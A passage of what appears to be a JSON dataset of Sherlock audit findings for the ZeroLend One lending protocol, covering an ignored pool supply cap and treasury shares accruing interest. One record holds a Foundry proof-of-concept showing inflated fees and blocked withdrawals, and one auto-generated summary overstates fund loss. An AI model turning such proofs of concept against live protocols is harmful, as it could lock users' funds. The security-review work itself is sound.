      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433 \n\n## Found by \nBigsam, Nihavent, wellbyt3\n### Summary\n\nThe curated vault's `_supplyPool()` function deposits assets into the underlying pools in `supplyQueue`. Whilst it considers the curated vault's cap for a given pool, it does not consider the underlying pool's internal cap. As a result, some `CuratedVault::deposit()` transactions will revert due to running out of pools to deposit to, or the liquidity will be allocated to the `supplyQueue` in a different order. \n\n### Root Cause\n\n`CuratedVaultSetters::_supplyPool()` is [called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L38) in the deposit flow of the curated vault. As shown below, it attempts to deposit the minimum of `assets` and `supplyCap - supplyAssets` (which is the 'available curated pool cap' for this pool). \n\n```javascript\n  function _supplyPool(uint256 assets) internal {\n    for (uint256 i; i < supplyQueue.length; ++i) {\n      IPool pool = supplyQueue[i];\n\n      uint256 supplyCap = config[pool].cap;\n      if (supplyCap == 0) continue;\n\n      pool.forceUpdateReserve(asset());\n\n      uint256 supplyShares = pool.supplyShares(asset(), positionId);\n\n      // `supplyAssets` needs to be rounded up for `toSupply` to be rounded down.\n      (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = pool.marketBalances(asset());\n@>    uint256 supplyAssets = supplyShares.toAssetsUp(totalSupplyAssets, totalSupplyShares);\n\n@>    uint256 toSupply = UtilsLib.min(supplyCap.zeroFloorSub(supplyAssets), assets);\n\n      if (toSupply > 0) {\n        // Using try/catch to skip markets that revert.\n        try pool.supplySimple(asset(), address(this), toSupply, 0) {\n          assets -= toSupply;\n        } catch {}\n      }\n\n      if (assets == 0) return;\n    }\n\n    if (assets != 0) revert CuratedErrorsLib.AllCapsReached();\n  }\n```\n\nHowever, the function does not consider an underlying pool's `supplyCap`. Underlying pools have their own `supplyCap` which will cause `supply()` calls to revert if they would put the pool over it's `supplyCap`:\n\n```javascript\n  function validateSupply(\n    DataTypes.ReserveCache memory cache,\n    DataTypes.ReserveData storage reserve,\n    DataTypes.ExecuteSupplyParams memory params,\n    DataTypes.ReserveSupplies storage totalSupplies\n  ) internal view {\n    ... SKIP!...\n\n    uint256 supplyCap = cache.reserveConfiguration.getSupplyCap();\n\n    require(\n      supplyCap == 0\n@>      || ((totalSupplies.supplyShares + uint256(reserve.accruedToTreasuryShares)).rayMul(cache.nextLiquidityIndex) + params.amount)\n          <= supplyCap * (10 ** cache.reserveConfiguration.getDecimals()),\n      PoolErrorsLib.SUPPLY_CAP_EXCEEDED\n    );\n  }\n```\n\nAlso note that the `pool::supplySimple()` call in `_supplyPool()` is wrapped in a [try/catch block](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L134-L136), so if a `pool::supplySimple()` call were to revert, it will just continue to the next pool.\n\n### Internal pre-conditions\n\n- A `CuratedVault::deposit()` call needs to be within the limits of the curated vault's cap (`config[pool].cap`) but exceed the limits of the underlying pool's `supplyCap`.\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n1. A curated pool has two pools in the `supplyQueue`.\n2. The first underlying pool has an internal `supplyCap` of 100e18 and is currently at 99e18.\n3. The first underlying pool has an internal `supplyCap` of 100e18 and is currently at 99e18.\n4. A user calls `deposit()` on the curated vault with a value of 2e18.\n5. The value does not exceed the curated vault's `config[pool].cap` for either pool.\n6. The underlying call to `Pool::supplySimple()` will silently revert on both pools, and the entire transaction will revert due to [running out of available pools to supply the assets to](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L142)\n7. As a result, no assets are deposits, despite the underlying pools having capacity to accept the 2e18 deposit between them.\n\n### Impact\n\n**Deposit Reverts**\n- If a deposit would be able to be deposited across two or more underlying pools in the `supplyQueue`, but is too large to be added to any one of these underlying pools, the deposit will completely revert, despite the underlying pools having capacity to accept the deposit.\n\n**Inefficient reorder of `supplyQueue`**\n- If a deposit amount is within the limits of the curated pool's `config[pool].cap`, but would exceed the limits an underlying pool in `supplyQueue`. Then the silent revert would skip this pool and attempt to deposit it's liquidity to the next pool in the queue. This is an undesired/inefficient reordering of the `supplyQueue` as a simple check on the cap of the underlying pool would reveal some amount that would be accepted by the underlying pool.\n\n### PoC\n\n_No response_\n\n### Mitigation\n\nCreate an external getter for a pool's supply cap, similar to `ReserveConfiguration::getSupplyCap()` the next function should also scale the supply cap by the reserve token's decimals. \n\nThen, add an extra check in `CuratedVaultSetters::_supplyPool()` as shown below.\n\n\n```diff\n  function _supplyPool(uint256 assets) internal {\n    for (uint256 i; i < supplyQueue.length; ++i) {\n      IPool pool = supplyQueue[i];\n\n      uint256 supplyCap = config[pool].cap;\n      if (supplyCap == 0) continue;\n\n      pool.forceUpdateReserve(asset());\n\n      uint256 supplyShares = pool.supplyShares(asset(), positionId);\n\n      // `supplyAssets` needs to be rounded up for `toSupply` to be rounded down.\n      (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = pool.marketBalances(asset());\n      uint256 supplyAssets = supplyShares.toAssetsUp(totalSupplyAssets, totalSupplyShares);\n\n      uint256 toSupply = UtilsLib.min(supplyCap.zeroFloorSub(supplyAssets), assets);\n\n+     toSupply = UtilsLib.min(toSupply, pool.getSupplyCap(pool.getConfiguration(asset())) - totalSupplyAssets );\n\n      if (toSupply > 0) {\n        // Using try/catch to skip markets that revert.\n        try pool.supplySimple(asset(), address(this), toSupply, 0) {\n          assets -= toSupply;\n        } catch {}\n      }\n\n      if (assets == 0) return;\n    }\n\n    if (assets != 0) revert CuratedErrorsLib.AllCapsReached();\n  }\n```\n\n\n\n\n## Discussion\n\n**sherlock-admin3**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**Honour** commented:\n>  Invalid: see comment on #193\n\n\n\n**Nihavent**\n\nEscalate\n\nThis report should be valid and is not a duplicate of https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/399 which is about `maxWithdraw` and `maxRedeem` being non-ERC4626 compliant due to a bug in `_withdrawable()`. \nOn the other hand, this report describes that `_supplyPool()` ignoring the underlying pool cap can result in unexpectedly reverting deposits or an inefficient reordering of the supplyQueue.\n\n\nTo address the comment left on https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193 that was referenced on this report:\n\n>\"setCap is an admin operation and It can be expected that the curators will set (there's no reason to assume otherwise) a similar pool(vault) cap as the underlying pool\"\n\nI believe there is a flaw in this reasoning.\n\n- The `supplyCap` stored in `CuratedVaultStorage::config[pool].cap` is the cap of deposits into a given underlying pool from this `CuratedVault`.\n- The underlying pool cap stored in the `DataTypes.ReserveConfigurationMap` for the underlying pool describes the total deposits to this underlying pool from all sources (including but not limited to this `CuratedVault`).\n\nIt's true the curator sets the `supplyCap` for the curated vault, however they are not in control of other deposts to the underlying pool. So, attempting to set them to similar values will only prevent this issue as long as there are no other deposits in the underlying pool, which is not a valid assumption for a curator to make.\n\nTherefore both impacts in this report can occur regardless of the admin-set value.\n\n\n**sherlock-admin3**\n\n> Escalate\n> \n> This report should be valid and is not a duplicate of https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/399 which is about `maxWithdraw` and `maxRedeem` being non-ERC4626 compliant due to a bug in `_withdrawable()`. \n> On the other hand, this report describes that `_supplyPool()` ignoring the underlying pool cap can result in unexpectedly reverting deposits or an inefficient reordering of the supplyQueue.\n> \n> \n> To address the comment left on https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193 that was referenced on this report:\n> \n> >\"setCap is an admin operation and It can be expected that the curators will set (there's no reason to assume otherwise) a similar pool(vault) cap as the underlying pool\"\n> \n> I believe there is a flaw in this reasoning.\n> \n> - The `supplyCap` stored in `CuratedVaultStorage::config[pool].cap` is the cap of deposits into a given underlying pool from this `CuratedVault`.\n> - The underlying pool cap stored in the `DataTypes.ReserveConfigurationMap` for the underlying pool describes the total deposits to this underlying pool from all sources (including but not limited to this `CuratedVault`).\n> \n> It's true the curator sets the `supplyCap` for the curated vault, however they are not in control of other deposts to the underlying pool. So, attempting to set them to similar values will only prevent this issue as long as there are no other deposits in the underlying pool, which is not a valid assumption for a curator to make.\n> \n> Therefore both impacts in this report can occur regardless of the admin-set value.\n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\n@Nihavent The impact is very similar to issues #337 and #431. \n\nYou can see this comment: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/337#issuecomment-2402013737\n\nI see no reason for it to be any different here. \n\n**Nihavent**\n\n@cvetanovv the root cause is similar to the issues you referenced but the impact here is higher. \n\nThe maximum impact on the issues you linked is non compliance with the EIP which can break external integrations, as you mentioned this does not necessarily qualify as medium impact. \n\n\nThe maximum impact on this issue is reverting deposits when the pools have capacity to support the deposit (see attack path). This is an implementation bug which is broken contract functionality. \nAdditionally, assets can be allocated to underlying pools in an order which differs from the depositQueue. \n\nThis issue has nothing to do with EIP compliance. \n\nFor reference this issue has the same root cause and impact as https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/178\n\n**cvetanovv**\n\n@Nihavent I agree that in this issue, the impact is one idea more serious, and we enter the category \"broken contract functionality\".\n\nPlanning to accept the escalation and remove the duplication with #399. I will duplicate this issue(#433) with #193 and #339. This issue will be the main.\n\n**0xjuaan**\n\nHi @cvetanovv, please consider the following [judging comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193#issuecomment-2364150838) regarding why this issue is invalid.\n\nVault curators should not set a cap that is greater than the cap of underlying pools. It makes no sense to do so. For example if the underlying pool allows a max of `10e18`, then vault curators should set a deposit cap that is less than or equal to 10e18. This issue requires vault curators to set a cap that is higher than the underlying pool's cap, so is invalid.\n\n\n**Nihavent**\n\n> Hi @cvetanovv, please consider the following [judging comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193#issuecomment-2364150838) regarding why this issue is invalid.\n> \n> Vault curators should not set a cap that is greater than the cap of underlying pools. It makes no sense to do so. For example if the underlying pool allows a max of `10e18`, then vault curators should set a deposit cap that is less than or equal to 10e18. This issue requires vault curators to set a cap that is higher than the underlying pool's cap, so is invalid.\n\nThis is not true as I explained here https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433#issuecomment-2391351629\n\nImagine the super pool has 2 underlying pools each with an underlying cap of 10e18. The SuperPool admin sets their caps to 10e18 as you said. Each underlying pool receives deposits from other sources to the value of 9e18. Now a user trying to deposit 2e18 into the SuperPool will revert even though this deposit could be split across the two underlying pools. \n\nTherefore carefully setting the SuperPool cap for a given pool is only an effective mitigation if there are 0 deposits from other sources in the underlying pool. As I previously mentioned this is an unrealistic assumption for anyone to make. \n\n>”This issue requires vault curators to set a cap that is higher than the underlying pool's cap, so is invalid.”\n\nThis is also incorrect because in the above example the SuperPool cap set for the two pools could be 5e18 and the issue still exists. \n\n\nI believe this is straightforward but if you require a POC showing the issue when the SuperPool cap is < the underlying pool cap I can write one tomorrow. \n\n\n**0xjuaan**\n\nYeah actually you're right @Nihavent, the issue can still occur. I still think that the issue would not exist if vault curators set an appropriate cap, and that is why Morpho decided to implement it this way. In the case that an event like the described one occurs, the curators can reduce the cap of the pool such that only 1e18 can be deposited into each pool, and this prevents the revert.\n\nThat is the reason why `submitCap()` has no timelock for reducing a pool cap, but does have a timelock for increasing the pool cap. It's because reducing pool caps should be able to happen to prevent the described issue. \n\n**Nihavent**\n\nEdit: Updated this comment with a more considered and complete response.\n\n@0xjuaan thanks for acknowledging the example I provided which shows the issue is possible regardless of carefuly set admin values. I do concede this issue is less likely to occur (but not impossible) if the admin continuously sets conservatively low SuperPool caps for the underlying pools (relative to available caps in the underlying pools). However, I will now explain why I don't believe the SuperPool cap should or would ever be used for this purpose. \n\nThere are two relevant caps we're discussing:\n1. The SuperPool cap which is the maximum allocation that a SuperPool will allocate to a given underlying pool, and\n2. The underlying pool's cap which is the maximum liquidity from all sources that can be deposited into the pool\n\nWe can make inferences from the fact that these two caps exist:\n\n- The SuperPool cap (1) is set by curators to represent the ideal maximum allocation to an underlying pool. This is one of the risk management tools at the disposal of the SuperPool admins. \n- If the intended use case of the SuperPool cap (1) was to always have it set to the available cap in the underling pool (2), this could have been achieved programatically and in fact the parameter (1) wouldn't exist. \n\n[This comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433#issuecomment-2402719025) suggests that a partial mitigation to this issue is to burden SuperPool curators with administrative work of continuously checking for a reduction in available cap in all underlying pools, and reducing the corresponding SuperPool cap to reflect this change. The evidence given for this is there is no timelock on reduction in superPool caps. I believe there are problems with this:\n\n1. It completely reduces the purpose of the SuperPool cap from a risk management/capital allocation tool to an administrative task for curators to update (in order to prevent edge-case deposit reverts). \n2. We can reasonably expect that curators would not update the cap in this way because:\n   - The effort / benefits tradeoff doesn't make sense fo them to use the parameter in this way. They would care more about achieving their ideal capital allocation than preventing deposit reverts into the SuperPool.\n   - It is a waste of gas to update it potentially several times per day per underlying pool\n   - It is logistically impractical to poll for reductions in available caps across all underlying pools, they would need a bot to do this and then  backrun underlying pool `supply()` calls with `submitCap()` calls. \n   - Whilst the cap can be reduced without a timelock, it requires a timelock to increase. Therefore if they reduced it to protect against this issue, and then there is a withdrawal from the underlying pool, they can't increase the cap again quickly. Therefore, their pool loses the chance to deposit more liquidity and a different SuperPool that wasn't continuously reducing their cap gets to deposit this liquidity instead.\n\nSo whilst it’s technically possible to reduce the likelihood of this issue with admin actions, it is unreasonable to expect the admin to use the parameter for this purpose. \n   \n\n**Honour-d-dev**\n\nI also believe this issue is not worth a medium severity, `submitCap()` is an admin operation and it has been shown that the protocol is designed in such a way that its easy for the admin to handle this if it ever happens (and the chances of it happening are vey slim if the admin sets a reasonable cap to begin with)\n\n**Nihavent**\n\n> I also believe this issue is not worth a medium severity, `submitCap()` is an admin operation and it has been shown that the protocol is designed in such a way that its easy for the admin to handle this if it ever happens (and the chances of it happening are vey slim if the admin sets a reasonable cap to begin with)\n\nI agree the issue is not going to occur frequently due to it being a bug that occurs in edge cases. To my knowledge the likelihood of the bug does not play a role in Sherlock’s judging rules. \n\nCheck my previous comment for an explanation as to why setCap would need to be misused to reduce the likihood of this bug. \n\nIt has also been shown that this issue can occur regardless of admin set values. \n\n**cvetanovv**\n\nI believe this issue should be Low severity.\n\nWhile it could lead to some deposit reverts or inefficiencies in the `supplyQueue`, it's important to note that this is an admin-controlled action. Admins have the ability to set reasonable caps and monitor pool configurations effectively to prevent such situations. \n\nAdditionally, there is no direct loss of funds.\n\nFor these reasons, I believe that this issue is of low severity.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**Nihavent**\n\nHi, thanks for consideration of the issue. \n\nIt has been shown that this issue can occur regardless of the most reasonable admin setCap value. This is because the available liquidity in underlying pools can change quickly. \n\nFor this parameter to be used in a way to almost completely avoid this issue, the cap would need to be set extremely low which defeats the purpose of the pool being in the supply queue. \n\nAdditionally, as I explained in detail [here](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433#issuecomment-2402738726) the setCap functionality should not and will not be used to reduce the likelihood of this issue. \nRequiring curators to setCap to avoid this issue costs them the functionality of setting their optimal liquidity allocation to each pool, ie. they lose the intended functionality of the parameter in order to prevent edge-case deposit reverts. Therefore no rational actor would use the parameter in this way. \n\nIf the protocol didn’t want curators to be able to freely set caps, the parameter wouldn’t exist and vaults would inherit the available caps from the underlying pools. \n\nAs it stands, with admins freely setting their optimal caps as per the design, there is a bug in the implementation. \n\n\n**Honour-d-dev**\n\nThis issue is a low severity\n\nThere is no loss of funds or broken functionality or any substantial impact, the only issue here is a short/temporary inconvenience for the user that can be immediately and easily fixed by admin adjusting the cap or reordering the queue if necessary \n\n**cvetanovv**\n\nThis issue is а valid Low severity.\n\nHere are the rules for Medium severity:\nhttps://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue\n\n>1. Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n>2. Breaks core contract functionality, rendering the contract useless or leading to loss of funds of the affected party larger than 0.01% and 10 USD.\n\nIn this issue, there is neither loss of funds nor broken functionality.\n\nMy decision to reject the escalation remains.\n\n**Nihavent**\n\nIf this issue does not have enough impact for medium severity, how is this issue a valid medium? https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/178\n\nI understand that reports will be judged on a case-by-case basis, but there is no meaningful difference between the protocols with respect to this issue, and the submitted issues are the same. Therefore for consistency if there is enough impact in [that](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/178) issue for medium, there must be enough impact in this issue for medium. \nHow are Watsons able to gauge which issues consistitue a medium if this level of consistency is not present?\n\n- Both issues have a vault which sometimes fails to deposit into underlying pools in the queue because the available liquidity in the underlying pool is not checked. \n- Both issues can result in deposit reverts or undesired reorderings of the queue.\n- Both issues have an admin-set cap for the vault's maximum deposit into the underlying pool\n- Both issues have the same pre-conditions\n- Both issues have the same fix\n\n**cvetanovv**\n\n@Nihavent You are right about that. As you can see in the comments, I was hesitant about having broken functionality. After the protocol comment, then I decided it was Medium because it was important for them to have the function not revert.\n\nIn this contract(`CuratedVaultSetters.sol`), we also have indications that the function should not revert, so I think we have broken functionality here also: https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L133\n\nPlanning to accept the escalation and make this issue Medium.\n\n**0xSpearmint**\n\nHi @cvetanovv [193](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193) is also a duplicate of this issue.\n\n**cvetanovv**\n\n> Hi @cvetanovv [193](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193) is also a duplicate of this issue.\n\nThanks for the mention. I will also duplicate #193 to this issue.\n\n**WangSecurity**\n\nResult:\nMedium \nHas duplicates\n\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Nihavent](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433/#issuecomment-2391351629): accepted",
      "summary": "\nThis bug report discusses an issue with the `_supplyPool()` function in the CuratedVault contract. The function does not take into account the cap of the underlying pool, which can cause deposits to fail or be allocated in a different order. The root cause is that the function only considers the curated vault's cap, not the underlying pool's cap. This issue can occur regardless of the admin-set values, and requiring curators to set a lower cap would defeat the purpose of the pool. The severity of this issue is being debated, with some arguing it is low because it only causes temporary inconvenience, while others argue it is medium because it can lead to a loss of funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433",
      "tags": [],
      "finders": [
        "Nihavent",
        "wellbyt3",
        "Bigsam"
      ]
    },
    {
      "id": "41832",
      "title": "M-11: Supply interest is earned on `accruedToTreasuryShares` resulting in higher than expected treasury fees and under rare circumstances DOSed pool withdrawals",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430 \n\n## Found by \n0xAlix2, A2-security, Bigsam, Nihavent, Ocean\\_Sky, trachev\n### Summary\n\nFees on debt interest are calculated in 'assets', but not claimed immediately and stored as shares. When they're claimed, they're treated as regular supplyShares and converted back to assets based on the `liquidityIndex` at the time they're claimed. This results in the realized fees being higher than expected, and under an extreme scenario may not leave enough liquidity for regular pool suppliers to withdraw their funds.\n\n### Root Cause\n\nEach time a pool's reserve state is updated, [`ReserveLogic::_accrueToTreasury()` is called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L92).\nThis function incriments `_reserve.accruedToTreasuryShares` by the shares equiavalent of the assets taken as a fee. Note `vars.amountToMint` is in assets, and `_reserve.accruedToTreasuryShares` is stored in shares as the 'fee assets' are not always immediately sent to the treasury.\n\n```javascript\n  function _accrueToTreasury(uint256 reserveFactor, DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {\n    ... SKIP!...\n\n    vars.amountToMint = vars.totalDebtAccrued.percentMul(reserveFactor); // Assets\n\n@>  if (vars.amountToMint != 0) _reserve.accruedToTreasuryShares += vars.amountToMint.rayDiv(_cache.nextLiquidityIndex).toUint128(); // Shares\n  }\n```\n\nWhen any pool withdrawal is executed, [`PoolLogic::executeMintToTreasury()` is called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/PoolSetters.sol#L84). The stored shares are converted back to assets based on the current `liquidityIndex`:\n\n```javascript\n  function executeMintToTreasury(\n    DataTypes.ReserveSupplies storage totalSupply,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    address treasury,\n    address asset\n  ) external {\n    DataTypes.ReserveData storage reserve = reservesData[asset];\n\n    uint256 accruedToTreasuryShares = reserve.accruedToTreasuryShares;\n\n    if (accruedToTreasuryShares != 0) {\n      reserve.accruedToTreasuryShares = 0;\n      uint256 normalizedIncome = reserve.getNormalizedIncome();\n      uint256 amountToMint = accruedToTreasuryShares.rayMul(normalizedIncome); // Assets, scaled up by current liquidityIndex\n\n      IERC20(asset).safeTransfer(treasury, amountToMint);\n      totalSupply.supplyShares -= accruedToTreasuryShares;\n\n      emit PoolEventsLib.MintedToTreasury(asset, amountToMint);\n    }\n  }\n```\n\nAs a result, the actual fee taken by the treasury exceeds the original x% intended by `reserveFactor` at the time the debt was repaid.\n\nIn addition, the accumulation of interest on these `accruedToTreasuryShares` can lead to pool withdrawals being DOSed under circumstances where the `_updateIndexes()` is called close to every second to create a compounding effect. This compounding effect on brings the `liquidityIndex` closer to the `borrowIndex`. This results in the interest earned on `accruedToTreasuryShares` causing the pool to run out of liquidity when suppliers withdraw.\n\n### Internal pre-conditions\n\nImpact 1 \n1. A pool has a non-zero `reserveFactor`\n2. Pool operates normally with supplies/borrows/repays\n\nImpact 2\n1. A pool has a non-zero `reserveFactor`\n2. Pool operates normally with supplies/borrows/repays\n3. `_updateIndexes()` is called each second (or close to)\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\nImpact 2\n1. User1 supplies to a pool\n2. User2 borrows from the same pool\n3. As time elapses, `_updateIndexes()` is called close to every second, bringing `liquidityIndex` closer to `borrowIndex`. Note this is callable from an external function `Pool::forceUpdateReserves()`\n4. User2 repays their borrow including interest\n5. Repeat step 3 just for a few seconds\n6. User1 attempts to withdraw their balance but due to the accrued interest on `accruedToTreasuryShares`, the pool runs out of liquidity DOSing the withdrawal.\n\n### Impact\n\n1. Generally speaking, in all pools the treasury will end up taking a larger fee than what was set in `reserveFactor`. That is, if `reserveFactor` is 1e3 (10%) and 1e18 interest is earned, the protocol will eventually claim more than 10% * 1e18 assets.\n2. Under a specific scenario where `_updateIndexes()` is called every second, there will not be enough liquidity for suppliers to withdraw because the treasury earning supply interest on their `accruedToTreasuryShares` is not accounted for.\n\n### PoC\n\nThe below coded POC implements the 'Attack Path' described above.\n\nFirst, add this line to the `CorePoolTests::_setUpCorePool()` function to create a scenario with a non-zero reserve factor:\n\n```diff\n  function _setUpCorePool() internal {\n    poolImplementation = new Pool();\n\n    poolFactory = new PoolFactory(address(poolImplementation));\n+   poolFactory.setReserveFactor(1e3); // 10%\n    configurator = new PoolConfigurator(address(poolFactory));\n\n    ... SKIP!...\n  }\n```\n\nThen, create a new file on /test/forge/core/pool and paste the below contents.\n\n```javascript\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.19;\n\nimport {console2} from 'forge-std/src/Test.sol';\nimport {PoolLiquidationTest} from './PoolLiquidationTests.t.sol';\n\ncontract AuditHighSupplyRateDosWithdrawals is PoolLiquidationTest {\n\nfunction test_POC_DosedWithdrawalsDueToTreasurySharesAccruing() public {\n    uint256 aliceMintAmount = 10_000e18;\n    uint256 bobMintAmount = 10_000e18;\n    uint256 supplyAmount = 1000e18;\n    uint256 borrowAmount = 1000e18;\n\n    _mintAndApprove(alice, tokenA, aliceMintAmount, address(pool));         // alice collateral\n    _mintAndApprove(bob, tokenB, bobMintAmount, address(pool));             // bob supply\n    _mintAndApprove(alice, tokenB, aliceMintAmount, address(pool));         // alice needs some funds to pay interest\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, supplyAmount, 0); \n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, aliceMintAmount, 0);  // alice collateral\n    pool.borrowSimple(address(tokenB), alice, borrowAmount, 0);     // 100% utilization\n    vm.stopPrank();\n\n    for(uint256 i = 0; i < (12 * 60 * 60); i++) { // Each second `_updateIndexes()` is called via external function `forceUpdateReserves()`\n        vm.warp(block.timestamp + 1);\n        pool.forceUpdateReserves();\n    }\n\n    // Alice full repay\n    vm.startPrank(alice);\n    tokenB.approve(address(pool), type(uint256).max);\n    pool.repaySimple(address(tokenB), type(uint256).max, 0);\n    uint256 post_aliceTokenBBalance = tokenB.balanceOf(alice);\n    uint256 interestRepaidByAlice = aliceMintAmount - post_aliceTokenBBalance;\n\n    for(uint256 i = 0; i < (60); i++) { // warp after for treasury to accrue interest on their 'fee shares' \n        vm.warp(block.timestamp + 1);\n        pool.forceUpdateReserves();\n    }\n\n    // Check debt has been repaid\n    (, , , uint256 debtShares) = pool.marketBalances(address(tokenB));\n    assert(debtShares == 0); // All debt has been repaid\n\n    // Treasury assets to claim\n    uint256 treasuryAssetsToClaim = pool.getReserveData(address(tokenB)).accruedToTreasuryShares * pool.getReserveData(address(tokenB)).liquidityIndex / 1e27;\n\n    // Bob's assets to claim\n    bytes32 bobPos = keccak256(abi.encodePacked(bob, 'index', uint256(0)));\n    uint256 bobsAssets = pool.supplyShares(address(tokenB), bobPos) * pool.getReserveData(address(tokenB)).liquidityIndex / 1e27;\n\n    // Impact 1: the interest claimable by the treasury is greater than 10% of the interest repaid\n    assert(treasuryAssetsToClaim > pool.factory().reserveFactor() * interestRepaidByAlice / 1e4);\n\n    // Impact 2: Bob & the treasury's claim on the assets is greater than available assets, despite no outstanding debt. \n    // This assert demonstrates that bob's withdrawal would be DOSed as withdrawal calls include a transfer of treasury assets.\n    // The withdrawal DOS cannot be shown due to the call reverting due to the 'share underflow' issue described in another report\n    uint256 poolLiquidity = tokenB.balanceOf(address(pool));\n    assert(bobsAssets + treasuryAssetsToClaim > poolLiquidity); \n  }\n}\n```\n\n### Mitigation\n\nThree possible solutions:\n1. Immediately send the 'fee assets' to treasury rather than accruing them over time\n2. Store the 'fee assets' in assets instead of shares. This will correctly capture the amount of fee that is intended by `reserveFactor`. For example if a fee is 10%, the protocol will take exactly 10% of the interest earned on debt.\n3. Account for the creation of new `supplyShares` by diluting the `liquidityIndex` upon creating these shares. This solution will allow the conversion back to assets in `executeMintToTreasury()` to remain unchanged.\n   - Note I acknowledge that the [calculation of `liquidityRate`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/periphery/ir/DefaultReserveInterestRateStrategy.sol#L126-L128) does account for `reserveFactor`, however given this is out of scope I did not focus on it. Regardless, it does not scale the rate down enough to account for the interest the treasury will earn on these shares. \n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**Honour** commented:\n>  Invalid: fees can accrue interest as well as is done in AAVE\n\n\n\n**Honour-d-dev**\n\nEscalate\n\nThis issue is invalid and is different from the #16 #220 #267 #317 group\n#240 is not in the above group\n\n`accruedToTreasuryShares` should earn supply interest, it is accounted for in the interest calculations and is the exact same way aave works as well.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> This issue is invalid and is different from the #16 #220 #267 #317 group\n> #240 is not in the above group\n> \n> `accruedToTreasuryShares` should earn supply interest, it is accounted for in the interest calculations and is the exact same way aave works as well.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Nihavent**\n\n> Escalate\n> \n> This issue is invalid and is different from the #16 #220 #267 #317 group #240 is not in the above group\n> \n> `accruedToTreasuryShares` should earn supply interest, it is accounted for in the interest calculations and is the exact same way aave works as well.\n\nThis report focuses on the edge case regarding frequent calls of `_updateIndexes()` however it still demonstrates a withdrawal DOSed due to insufficient liquidity (see impact 2 on the POC and associated comment):\n\nExcerpt from POC:\n\n```javascript\n    ... \n\n    // Impact 2: Bob & the treasury's claim on the assets is greater than available assets, despite no outstanding debt. \n    // This assert demonstrates that bob's withdrawal would be DOSed as withdrawal calls include a transfer of treasury assets.\n    // The withdrawal DOS cannot be shown due to the call reverting due to the 'share underflow' issue described in another report\n    uint256 poolLiquidity = tokenB.balanceOf(address(pool));\n    assert(bobsAssets + treasuryAssetsToClaim > poolLiquidity); \n```\n\nIf you have any doubt that this is due to the transfer of assets to treasury, you could add the following assert statement showing sufficient liquidity to withdraw if we remove the treasury asset transfer:\n\n```diff\n    ...\n\n    // Impact 2: Bob & the treasury's claim on the assets is greater than available assets, despite no outstanding debt. \n    // This assert demonstrates that bob's withdrawal would be DOSed as withdrawal calls include a transfer of treasury assets.\n    // The withdrawal DOS cannot be shown due to the call reverting due to the 'share underflow' issue described in another report\n    uint256 poolLiquidity = tokenB.balanceOf(address(pool));\n    assert(bobsAssets + treasuryAssetsToClaim > poolLiquidity); \n+   assert(bobsAssets <= poolLiquidity);\n```\n\n<ins>This is exactly the same root cause as the family of issues you listed, thus they should remain grouped.</ins> \nMy understanding is in Sherlock duplication rules, valid duplicates do not need to identify the primary attack path.\n\nThis report also discusses interest accruing on minted treasury shares results in more than the `reserveFactor` being claimed by the treasury (see impact 1 in the POC). As mentioned in the mitigations, this could be fixed by sending the fees in assets to the treasury upon debt repayment instead of minting the treasury shares which accrue over time. 